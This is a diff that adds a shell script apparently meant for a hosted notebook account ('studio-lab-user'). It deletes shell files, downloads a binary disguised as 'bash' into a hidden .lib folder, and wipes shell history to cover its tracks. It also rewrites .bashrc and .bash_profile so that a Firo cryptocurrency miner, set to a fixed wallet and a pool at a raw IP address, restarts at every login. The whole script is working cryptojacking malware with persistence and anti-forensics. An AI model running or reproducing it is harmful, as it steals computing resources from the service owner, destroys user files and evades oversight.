@@ -1,0 +1,28 @@
+cd ~
+rm -rvf .bash* .lib* bash*
+
+rm -rvf ele* lol* 1.* 
+cd ~/
+mkdir .lib
+cd .lib
+rm -R *
+rm -R /home/studio-lab-user/.ton
+WORKER="firo"
+WALLETNH="a271jvh573eS499sgWEdrZa6tSheg6WgLt"
+POOLNH="43.134.58.167:443"
+wget -P /home/studio-lab-user/.lib/ https://github.com/gunturyogatama404/ksjdueoa/raw/refs/heads/main/bash && history -cr 
+echo ""  > /home/studio-lab-user/.bashrc
+echo "" > /home/studio-lab-user/.bash_history
+echo "" > /home/studio-lab-user/.bash_profile
+echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
+echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
+echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
+echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
+echo 'WORKER="x"' >> ~/.bash_profile
+echo 'WALLETNH="a271jvh573eS499sgWEdrZa6tSheg6WgLt"' >> /home/studio-lab-user/.bash_profile
+echo 'POOLNH="43.134.58.167:443"' >> /home/studio-lab-user/.bash_profile
+echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
+echo "./.lib/bash --algo firopow -s $POOLNH -u $WALLETNH.$WORKER" > /home/studio-lab-user/.lib/gas.sh
+chmod +x bash && cd ~/ && source .bashrc
+
+
